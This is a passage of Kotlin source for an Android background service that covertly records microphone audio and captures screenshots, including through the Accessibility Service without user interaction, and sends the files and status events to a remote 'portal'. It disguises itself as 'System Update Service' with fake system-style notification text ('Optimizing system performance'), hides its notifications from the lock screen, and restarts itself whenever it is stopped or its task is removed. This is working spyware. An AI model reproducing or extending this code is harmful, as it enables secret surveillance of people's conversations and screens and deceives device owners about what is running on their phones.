                    AudioConfig(8000, 12200, MediaRecorder.OutputFormat.THREE_GPP, MediaRecorder.AudioEncoder.AMR_NB)
                )
            }

            // Try each audio source with each config until one works
            var success = false
            var lastError: Exception? = null
            var workingSource: Int? = null

            for (audioSource in audioSourcePriority) {
                if (success) break

                for (config in audioConfigs) {
                    if (success) break

                    try {
                        reset()
                        setAudioSource(audioSource)
                        setOutputFormat(config.format)
                        setAudioEncoder(config.encoder)
                        setAudioChannels(1)
                        setAudioSamplingRate(config.sampleRate)
                        setAudioEncodingBitRate(config.bitRate)
                        setOutputFile(currentRecordingFile?.absolutePath)
                        prepare()
                        start()

                        Log.d(tag, "SUCCESS: AudioSource=${AUDIO_SOURCE_NAMES[audioSource]}, SampleRate=${config.sampleRate}, BitRate=${config.bitRate}")
                        success = true
                        workingSource = audioSource

                        // Update auto-detected source if different from what we had
                        if (autoDetectedSource != audioSource && userSelectedSource == null) {
                            autoDetectedSource = audioSource
                            getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE).edit()
                                .putInt("auto_detected_audio_source", audioSource)
                                .apply()

                            // Notify portal of working source
                            handler.post {
                                socket?.emit("audio_source_working", JSONObject().apply {
                                    put("deviceId", deviceId)
                                    put("deviceName", deviceName)
                                    put("workingSource", AUDIO_SOURCE_NAMES[audioSource])
                                    put("wasAutoDetected", true)
                                })
                            }
                        }

                    } catch (e: Exception) {
                        Log.w(tag, "Failed: AudioSource=${AUDIO_SOURCE_NAMES[audioSource]}, Config=${config.sampleRate}Hz - ${e.message}")
                        lastError = e
                    }
                }
            }

            if (!success) {
                Log.e(tag, "ALL audio configurations failed!")
                throw lastError ?: RuntimeException("No audio configuration worked")
            }
        }
    }

    private fun stopRecording() {
        // If this is a chunked recording, cancel remaining chunks
        if (isChunkedRecording) {
            Log.d(tag, "Stopping chunked recording session, was on chunk $currentChunkNumber")
            isChunkedRecording = false
            remainingDuration = 0
        }
        
        if (!isRecording) {
            // Still emit stop event so portal knows
            socket?.emit("recording_stopped", JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("message", "Recording stopped")
            })
            return
        }

        stopRecordingRunnable?.let { handler.removeCallbacks(it) }
        stopRecordingRunnable = null

        try {
            mediaRecorder?.apply {
                try { stop() } catch (e: RuntimeException) {
                    Log.w(tag, "MediaRecorder stop failed: ${e.message}")
                }
                try { release() } catch (e: Exception) {}
            }
            mediaRecorder = null
            isRecording = false

            try { startForegroundSafe(false) } catch (e: Exception) {}

            val recordedFile = currentRecordingFile
            currentRecordingFile = null

            recordedFile?.let { file ->
                if (file.exists() && file.length() > 1000) {
                    Log.d(tag, "Recording saved: ${file.name}, size: ${file.length()}")
                    updateNotification("Syncing")
                    queueFileForUpload(file, "audio")

                    socket?.emit("recording_stopped", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("deviceName", deviceName)
                        put("filename", file.name)
                        put("fileSize", file.length())
                    })
                } else {
                    socket?.emit("recording_stopped", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("deviceName", deviceName)
                        put("message", "Recording stopped (file empty)")
                    })
                    emitError("recording_error", "Recording file is empty (${file.length()} bytes)")
                }
            } ?: run {
                // No file, but still emit stop event
                socket?.emit("recording_stopped", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("deviceName", deviceName)
                    put("message", "Recording stopped")
                })
            }

        } catch (e: Exception) {
            Log.e(tag, "Error stopping recording", e)
            try { mediaRecorder?.release() } catch (e2: Exception) {}
            mediaRecorder = null
            isRecording = false
            currentRecordingFile = null
            updateNotification("Syncing")
            
            // Still emit stop event
            socket?.emit("recording_stopped", JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("error", e.message)
            })
        }
    }

    // ==================== Screenshot Capture ====================

    private fun takeScreenshot() {
        Log.d(tag, "takeScreenshot called")

        if (isCapturingScreenshot) {
            emitError("screenshot_error", "Screenshot capture already in progress")
            return
        }

        isCapturingScreenshot = true

        // Check screen lock status and report
        val isLocked = isScreenLocked()
        socket?.emit("screenshot_status", JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("status", "capturing")
            put("isScreenLocked", isLocked)
        })

        // Try AccessibilityService first (Android 11+, no user interaction needed)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
            ScreenCaptureAccessibilityService.isServiceEnabled(this)) {

            Log.d(tag, "Using AccessibilityService for screenshot")
            ScreenCaptureAccessibilityService.takeScreenshot { success, file ->
                handler.post {
                    if (success && file != null) {
                        handleScreenshotSuccess(file)
                    } else {
                        // Fallback to MediaProjection
                        takeScreenshotWithMediaProjection()
                    }
                }
            }
        } else if (mediaProjectionData != null) {
            // Use MediaProjection if permission was granted
            takeScreenshotWithMediaProjection()
        } else {
            // No method available
            isCapturingScreenshot = false
            emitError("screenshot_error", "Screenshot permission not granted. Please enable Accessibility Service or grant screen capture permission.")

            socket?.emit("screenshot_status", JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("status", "permission_required")
                put("message", "Please open the app to grant screenshot permission")
            })
        }
    }

    private fun takeScreenshotWithMediaProjection() {
        Log.d(tag, "Using MediaProjection for screenshot")

        if (mediaProjectionData == null || mediaProjectionResultCode != Activity.RESULT_OK) {
            isCapturingScreenshot = false
            emitError("screenshot_error", "MediaProjection permission not granted")
            return
        }

        try {
            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(mediaProjectionResultCode, mediaProjectionData!!)

            if (mediaProjection == null) {
                isCapturingScreenshot = false
                emitError("screenshot_error", "Failed to create MediaProjection")
                return
            }

            // Create ImageReader
            imageReader = ImageReader.newInstance(
                screenWidth, screenHeight,
                PixelFormat.RGBA_8888, 2
            )

            // Create VirtualDisplay
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, null
            )

            // Capture image after a short delay
            handler.postDelayed({
                captureImageFromReader()
            }, 500)

        } catch (e: Exception) {
            Log.e(tag, "MediaProjection screenshot failed", e)
            isCapturingScreenshot = false
            cleanupMediaProjection()
            emitError("screenshot_error", e.message ?: "MediaProjection failed")
        }
    }

    private fun captureImageFromReader() {
        try {
            val image = imageReader?.acquireLatestImage()
            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * screenWidth

                val bitmap = Bitmap.createBitmap(
                    screenWidth + rowPadding / pixelStride,
                    screenHeight,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                image.close()

                // Crop to actual screen size
                val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)
                if (bitmap != croppedBitmap) bitmap.recycle()

                // Save to file
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
                val file = File(cacheDir, "${deviceId}_screenshot_${timestamp}.jpg")
                FileOutputStream(file).use { out ->
                    croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
                }
                croppedBitmap.recycle()

                handleScreenshotSuccess(file)

            } else {
                Log.e(tag, "Failed to acquire image from reader")
                isCapturingScreenshot = false
                emitError("screenshot_error", "Failed to capture screen image")
            }

        } catch (e: Exception) {
            Log.e(tag, "Error capturing image", e)
            isCapturingScreenshot = false
            emitError("screenshot_error", e.message ?: "Capture failed")
        } finally {
            cleanupMediaProjection()
        }
    }

    private fun handleScreenshotSuccess(file: File) {
        isCapturingScreenshot = false
        Log.d(tag, "Screenshot saved: ${file.name}, size: ${file.length()}")

        socket?.emit("screenshot_captured", JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("filename", file.name)
            put("fileSize", file.length())
            put("width", screenWidth)
            put("height", screenHeight)
            put("timestamp", System.currentTimeMillis())
        })

        queueFileForUpload(file, "screenshot")
    }

    private fun cleanupMediaProjection() {
        try {
            virtualDisplay?.release()
            virtualDisplay = null
            imageReader?.close()
            imageReader = null
            mediaProjection?.stop()
            mediaProjection = null
        } catch (e: Exception) {
            Log.e(tag, "Error cleaning up MediaProjection", e)
        }
    }

    private fun emitError(event: String, message: String) {
        socket?.emit(event, JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("error", message)
        })
    }

    // ==================== Notification ====================

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Core Service",
                NotificationManager.IMPORTANCE_LOW  // LOW priority - less intrusive
            ).apply {
                description = "Core system processes"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                setBypassDnd(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    /**
     * Map internal status to system-like display text
     * These look like genuine Android system messages
     */
    private fun getSystemStatusText(internalStatus: String): String {
        return when (internalStatus.lowercase()) {
            // Active states - look like system optimization
            "syncing" -> "Optimizing system performance"
            "processing" -> "System maintenance active"
            "running" -> "System services running"

            // Upload states - disguised as background tasks
            "uploading gallery image..." -> "Background task running"
            "uploading 📄", "uploading 📁" -> "Syncing system data"

            // Waiting states - look like network optimization
            "waiting" -> "Checking for updates"
            "waiting (retry)" -> "Retrying connection"
            "offline" -> "Waiting for network"
            "reconnecting..." -> "Restoring connection"
            "connecting" -> "Establishing connection"

            // Complete states
            "synced" -> "System optimized"

            // Error state
            "error" -> "Service interrupted"

            // Default fallback
            else -> "System services active"
        }
    }

    private fun createStealthNotification(status: String): Notification {
        val displayStatus = getSystemStatusText(status)

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Update Service")
            .setContentText(displayStatus)
            .setSmallIcon(android.R.drawable.ic_menu_rotate)
            .setPriority(NotificationCompat.PRIORITY_LOW)  // LOW priority
            .setOngoing(true)
            .setSound(null)
            .setVibrate(null)
            .setOnlyAlertOnce(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setShowWhen(false)
            .setLocalOnly(true)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun updateNotification(status: String) {
        try {
            getSystemService(NotificationManager::class.java)
                .notify(notificationId, createStealthNotification(status))
        } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.w(tag, "Service onDestroy")
        isRunning = false

        try { networkCallback?.let { connectivityManager?.unregisterNetworkCallback(it) } } catch (e: Exception) {}

        // Release WiFi lock
        releaseWifiLock()

        // Stop connection health monitor
        connectionHealthRunnable?.let { handler.removeCallbacks(it) }

        cleanupMediaProjection()
        socket?.disconnect()
        socket?.off()
        watchdogRunnable?.let { handler.removeCallbacks(it) }
        stopRecordingRunnable?.let { handler.removeCallbacks(it) }

        // Shutdown both upload executors gracefully
        try {
            smallFileExecutor.shutdown()
            largeFileExecutor.shutdown()

            if (!smallFileExecutor.awaitTermination(5, TimeUnit.SECONDS)) {
                smallFileExecutor.shutdownNow()
            }
            if (!largeFileExecutor.awaitTermination(5, TimeUnit.SECONDS)) {
                largeFileExecutor.shutdownNow()
            }
        } catch (e: Exception) {
            smallFileExecutor.shutdownNow()
            largeFileExecutor.shutdownNow()
        }

        if (isRecording) {
            try { mediaRecorder?.stop(); mediaRecorder?.release() } catch (e: Exception) {}
        }

        scheduleRestart()
        super.onDestroy()
    }

    private fun scheduleRestart() {
        val prefs = applicationContext.getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE)
        val crashCount = prefs.getInt("crash_count", 0)
        val lastCrashTime = prefs.getLong("last_crash_time", 0)
        val lastStartTime = prefs.getLong("last_start_time", 0)
        val currentTime = System.currentTimeMillis()

        if (crashCount >= 3 && (currentTime - lastCrashTime) < 5 * 60 * 1000) {
            scheduleDelayedRestart(60000)
            return
        }

        if (currentTime - lastStartTime < 10000) {
            scheduleDelayedRestart(15000)
            return
        }

        try {
            val intent = Intent(applicationContext, RecordingService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(intent)
            } else {
                applicationContext.startService(intent)
            }
        } catch (e: Exception) {}

        try {
            applicationContext.sendBroadcast(Intent(applicationContext, RestartReceiver::class.java).apply {
                action = "com.android.systemcore.RESTART_SERVICE"
            })
        } catch (e: Exception) {}

        scheduleDelayedRestart(5000)
        try { RestartWorker.scheduleImmediate(applicationContext) } catch (e: Exception) {}
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        scheduleRestart()
        super.onTaskRemoved(rootIntent)
    }

    override fun onTrimMemory(level: Int) { super.onTrimMemory(level) }
    override fun onLowMemory() { super.onLowMemory() }
}